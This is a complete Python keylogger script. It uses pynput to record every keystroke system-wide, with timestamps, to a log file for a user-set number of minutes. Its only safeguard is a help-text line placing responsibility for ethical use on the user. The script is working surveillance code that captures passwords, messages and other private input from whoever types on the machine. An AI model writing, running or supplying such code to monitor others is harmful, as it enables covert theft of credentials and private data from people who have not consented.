import argparse, os, time, logging
from pynput.keyboard import Listener
from threading import Timer

parser = argparse.ArgumentParser(
    description="""
    Log all system key inputs
    User is responsible for using this program ethically
    """, 
    formatter_class=argparse.RawTextHelpFormatter
    )

parser.add_argument("--filepath", dest="filepath", 
                    help="specify directory location to save log file. Otherwise, default will be same as program location"
                    )

parser.add_argument("--filename", dest="filename",
                    help="specify desired name for the log file. Must include extension in name. Otherwise, default will be 'key.log'"
                    )

parser.add_argument("-t", "--time", dest="time", required=True,
                    help="specify how long the logger should be active before thread is stopped. Enter time in minutes with min of 1 min")

args = parser.parse_args()

if args.filepath == None: 
    args.filepath = os.getcwd()


if os.path.isdir(args.filepath) == False:
    print("Specified directory does not exist. File will be saved in current directory")
    args.filepath = os.getcwd()

if args.filename == None: 
    args.filename = "key.log"

# configure what type of logging format we want
logging.basicConfig(filename=(str(args.filepath) + "/" + str(args.filename)), level=logging.DEBUG, format=" %(asctime)s   ----   %(message)s")

# every time a key is pressed, it will be logged
def on_press(key):
    logging.info(str(key))

# listener will monitor for every key press
with Listener(on_press=on_press) as listener :
    Timer(int(int(args.time) * 60), listener.stop).start()
    listener.join()
    print("time expired")